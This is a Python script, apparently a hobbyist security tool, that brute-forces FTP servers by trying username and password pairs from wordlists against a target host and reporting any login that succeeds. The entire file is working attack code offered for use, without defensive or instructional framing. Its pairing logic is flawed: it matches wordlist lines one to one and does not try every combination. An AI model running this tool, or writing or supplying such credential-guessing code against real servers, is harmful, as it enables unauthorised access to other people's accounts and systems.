#!/usr/bin/env python3

import ftplib
import optparse
import sys
from termcolor import colored

print('''
        ################################
        #     Python FTP BruteForcer   #
        #                              #
        #   Developed by Sheinn Khant  #
        ################################


     ''')


def main():
    parser = optparse.OptionParser("Usage: " +"Usage : python3 " + str(sys.argv[0]) + ' -H <hostname> -u <wordlist for username> -p <wordlist for password>')
    parser.add_option('-H' ,dest='tgthost', type='string', help='Specify Target Host')
    parser.add_option('-u', dest='usrlist', type='string' ,help='Specify wordlist for username')
    parser.add_option('-p' ,dest='passlist' ,type='string',help='Specify wordlist for password')
    (options, args) = parser.parse_args()

    host = options.tgthost
    userList = options.usrlist
    passList = options.passlist

    if (host == None) | (userList == None) | (passList == None):
        print(parser.usage)
        exit(0)
    
    try:
        user = open(userList, 'r')
        passwd = open(passList, 'r')
        for username,password in zip(user, passwd):
            username = username.strip()
            password = password.strip('\n')

            print(colored("[-] Login Failed : " + username + " / " + password,'red'))

            try:
                ftp = ftplib.FTP(host)
                login = ftp.login(username, password)
                print(colored("[+] Login Succeeded " + username + " / " + password, 'green'))
                ftp.quit()
                return(username,password)
            except:
                pass
        print("[-] Password not in list")
    except:
        print(colored("[!] File Doesn't Exist!",'red'))


main()

